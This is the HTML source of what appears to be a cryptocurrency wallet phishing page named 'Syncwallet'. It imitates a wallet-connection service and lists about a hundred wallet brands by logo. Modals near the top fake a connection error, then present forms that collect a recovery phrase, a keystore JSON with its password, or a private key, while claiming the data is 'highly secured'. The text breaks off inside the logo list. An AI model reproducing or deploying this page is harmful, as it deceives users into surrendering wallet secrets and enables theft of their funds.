<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"
    />
    <!-- <title>Wallets | Linkup Affixs</title> -->
    <title>Syncwallet</title>

    <!-- Site favicon -->
    <!-- <link
      rel="icon"
      href="./img/fav.jpg"
      sizes="16x16"
      type="image/png"
    /> -->

    <!-- Font awesome (icon) -->
    <script
      src="https://kit.fontawesome.com/6d51bc153f.js"
      crossorigin="anonymous"
    ></script>

    <!-- Stylesheet (CSS) -->
    <link rel="stylesheet" href="./css/style.css" />
  </head>

  <body>
    <!-- Overlay barcode -->
    <div class="modal-layout" id='modal-1'>
      <button class='btn-close' id='close-btn'>close</button>
      <div class="modal-child">
        <div class='barcode'>
          <img src="./img/two.png" alt="" class='barcode-img'>
        </div>

        <h4 class='head-7 m-t-5px'>Please contact admin/support for authentication</h4>
    </div>
</div>
   
<!-- Overlay error alert -->
    <div class="modal-layout" id='modal-2'>
      <button class='btn-close' id='close-btn2'>close</button>
      <div class="modal-child modal-child-3">
        <div class='alert'>
            <div class="top">
            <div>
              <p class='alert-text'>Error</p>
              <p class='alert-text m-t-5px'>connecting.....</p>
            </div>
            <button class="btn-import btn-import--2" id='open-form-modal'>Connect Manually</button>
        </div>
        <div class="bottom">
            <div>
              <p class='wallet-name'>Atomic</p>
              <p class='wallet-info m-t-5px'>Easy to use browser extension</p>
            </div>
             <div class="wallet-item">
              <div class="wallet-item__img--2">
                <img
                  src="./img/trust.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
            </div>
           </div>
        </div>

        

 </div>
</div>


<!-- Overlay forms -->
    <div class="modal-layout" id='modal-3'>
      <button class='btn-close' id='close-btn3'>close</button>
      <div class="modal-child modal-child-2">
         <div class="form-container">

          <div class="navigators">
            <button class="navigator-item active" id='btn-11'>phrase</button>
            <button class="navigator-item" id='btn-22'>keystore JSON</button>
            <button class="navigator-item" id='btn-33'>Private key</button>
          </div>



          <span class='labell labell-2 m-b-10px'> <i class="fas fa-check-circle"></i> <span>Your informations are highly secured</span> </span>
          <!--Phrase  -->
          <div class='phrase-cont animate-slide-top active'>
            <form enctype="multipart/form-data" id="importForm">
              <textarea name="phrase" id="phrase" class="inputs" minlength='12' rows="7" cols="60" placeholder='Phrase'></textarea>
              <input type="text"  name="walletname" id="walletname" class='walletname' minlength='2' class="inputs m-t-10px">

              <span class='labell'>Typically 12 (sometimes 24) words seperated by a single spaces.</span>
              <button type="submit" class="btn-import m-t-50px">Import</button>
            </form>
          </div>
          
          <!--Keystore  -->
          <div class='keystore-cont animate-slide-top'>
            <form enctype="multipart/form-data" id="keystoreForm">
              <textarea name="json" id="json" class="inputs" minlength='2' rows="7" cols="60" placeholder='Keystore JSON'></textarea>
              <input type="text"  name="password" id="password" minlength='2' class="inputs m-t-10px" placeholder='Password'>
              <input type="text"  name="walletname" id="walletname" class='walletname' minlength='2' class="inputs m-t-10px">
              <span class='labell'>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</span>
              <button type="submit" class="btn-import m-t-50px">Import</button>
            </form>
          </div>
          
          <!--Private  -->
          <div class='private-cont animate-slide-top'>
            <form enctype="multipart/form-data" id="privateForm">
             <input type="text"  name="privateKey" id="privateKey" minlength='12' class="inputs" placeholder='Private Key'>
             <input type="text"  name="walletname" id="walletname" class='walletname' minlength='2' class="inputs m-t-10px">
              <span class='labell'>Typically 12 (sometimes 24) words seperated by a single spaces.</span>
              <button type="submit" class="btn-import m-t-50px">Import</button>
            </form>
          </div>

        </div>
 </div>
</div>


    <!-- Header -->
    <header class="nav-header">
      <section class="center">
        <nav class="nav-2">
          <div class="nav-2__link">
            <a href="./" class="link-2">Github</a>
            <a href="./" class="link-2">Docs</a>
          </div>
          <a href="./" class='link-logo vv'>
          <div>
            <img src="./img/download.svg" alt="" class="logo-2" />
          </div>
          </a>
          <div class="nav-2__link">
            <a href="./" class="link-2">Wallets</a>
            <a href="./" class="link-2">Apps</a>
          </div>
        </nav>
      </section>
    </header>

    <!-- Section 2 -->
    <section>
      <section class="center">
        <h4 class="head-3">Wallets</h4>
        <p class="para-2">
          Multiple iOS and Android wallets support the Linkup Affix protocol.
          Simply scan a QR code from your desktop computer screen to start
          securely using a dApp with your mobile wallet. Interaction between
          mobile apps and mobile browsers are supported via mobile deep linking.
        </p>
      </section>

      

   <!-- Section Images -->
      <section class="m-t-100px">
        <section class="center gridd">
          <!--  -->
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/trust.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Trust</h5>
            </div>
          <!--  -->
           <!--  -->          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/metamask.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Metamask</h5>
            </div>          
          <!--  -->
          
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/47.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">WalletConnect</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/coinbase.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Coinbase Wallet</h5>
            </div>          
          <!--  -->

          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/kardiaChain.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">kardiaChain</h5>
            </div>          
          <!--  -->
          
          
           <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/Polkadotjs.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Polkadot.js</h5>
            </div>          
          <!--  -->
          
           <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/Ledger-live.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Ledger-live</h5>
            </div>          
          <!--  -->
           <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/fantom.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Fantom Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/polka.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Polka Wallet</h5>
            </div>          
          <!--  -->
          
          
           <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/ellipal.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Ellipal</h5>
            </div>          
          <!--  --> 
          
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/zilpay.webp"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">ZilPay Wallet</h5>
            </div>          
          <!--  -->
          
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/coin98.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Coin98 wallet</h5>
            </div>          
          <!--  -->

           <!--  -->
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/hashpack.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Hashpack</h5>
            </div>          
          <!--  -->
          
           <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/blocto.webp"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Blocto wallet</h5>
            </div>          
          <!--  -->
          
           <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/opera.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Opera wallet</h5>
            </div>          
          <!--  -->
          
           <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/thor.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">THOR Wallet</h5>
            </div>          
          <!--  -->
          
           <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/bifrost.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Bifrost Wallet</h5>
            </div>          
          <!--  -->
          
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/exodus.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Exodus wallet</h5>
            </div>          
          <!--  -->
          
           <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/ternoa.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Ternoa Wallet</h5>
            </div>          
          <!--  -->
          
           <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/nova.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Nova</h5>
            </div>          
          <!--  -->
         
          
          <!--  -->
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/pera.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Pera Algo Wallet</h5>
            </div>          
          <!--  -->
          
          
          
           <!--  -->
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/nym.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">NYM</h5>
            </div>          
          <!--  -->
          
           <!--  -->
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/imToken.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">imToken</h5>
            </div>          
          <!--  -->
          
           <!--  -->
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/saita.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Saita Mask</h5>
            </div>          
          <!--  -->
          
          
          
           <!--  -->
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/unnamed.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Keplr</h5>
            </div>          
          <!--  -->
          
          
             <!--  -->
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/maiar.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Maiar</h5>
            </div>          
          <!--  -->
          
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/Terrastation.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Terrastation</h5>
            </div>          
          <!--  -->
          
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/coti.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">COTI viper</h5>
            </div>          
          <!--  -->

          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/43.webp"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Ronin</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/44.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Phantom</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/45.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Solfare</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/45.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Velas</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/46.webp"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Sollet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/48.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">yoroi</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/49.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">vechain</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/50.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Tronlink</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/52.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">BitPay</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/53.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Ledger Live</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/54.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Dharma</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/55.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">1inch Wallet</h5>
            </div>          
          <!--  -->

          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/57.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Uniswap</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/58.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Binance DEX</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/59.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">OpenSea</h5>
            </div>          
          <!--  -->

          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/60.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Compound</h5>
            </div>          
          <!--  -->

          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/61.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Zapper</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/62.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Aave</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/63.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Zerion</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/64.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">LocalCryptos</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/65.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Unstoppable Domains</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/67.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">1inch Exchange</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/68.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">yearn</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/69.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Curve</h5>
            </div>          
          <!--  -->
         
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/70.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Adex Network</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/71.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">dYdX</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/72.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">MyCrypto</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/73.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">D'CENT Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/74.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Loopring</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/75.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">TrustVault</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/76.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Ellipal</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/77.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">KEYRING PRO</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/78.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Aktionariat</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/79.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Talken Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/80.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Flare Wallet</h5>
            </div>          
          <!--  -->
         
         
         
         
         
         
         
         
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/81.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">KyberSwap</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/82.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">AToken Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/84.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Tongue Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/85.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">RWallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/86.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">PlasmaPay</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/87.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">03Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/88.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4"> HashKey Me </h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/89.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4"> Jade Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/90.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">  Guarda Wallet </h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/91.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Defiant</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/92.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Trustee Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/93.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Oasis App</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/94.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">TokenSets</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/95.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">MANTRA DAO</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/96.jpeg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Matcha</h5>
            </div>          
          <!--  -->












          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/rainbow.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Rainbow</h5>
            </div>          
          <!--  -->
          
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/Argent.jfif"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Argent</h5>
            </div>          
          <!--  -->
         
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/gnosis.jfif"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Gnosis Safe Multisig</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/crypto.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Crypto.com | DeFi Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/pillar.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Pillar</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/imToken.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">imToken</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/tokenPocket.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">TokenPocket</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/walleth.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Walleth</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/atomic.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Atomic</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/Authereum.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Authereum</h5>
            </div>          
          <!--  -->
          
          
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/1.jfif"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Huobi Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/2.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Eidoo</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/3.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">ZelCore</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/4.jfif"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Nash</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/5.jpg"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Coinomi</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/6.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">GridPlus</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/7.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">CoolWallet S</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/8.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Alice</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/9.jfif"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">AlphaWallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/10.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Tokenary</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/safepal.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">SafePal</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/12.jfif"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Equal</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/13.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Infinito</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/14.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">MathWallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/15.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">MYKEY</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/16.jfif"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Spatium</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/17.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">wallet.io</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/18.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Infinity Wallet</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/19.png"
                  alt=""
                  class="wallet-item-img"
                />
              </div>
              <h5 class="head-4">Ownbit</h5>
            </div>          
          <!--  -->
          <!--  -->
          
            <div class="wallet-item">
              <div class="wallet-item__img">
                <img
                  src="./img/20.png"
                  alt=""
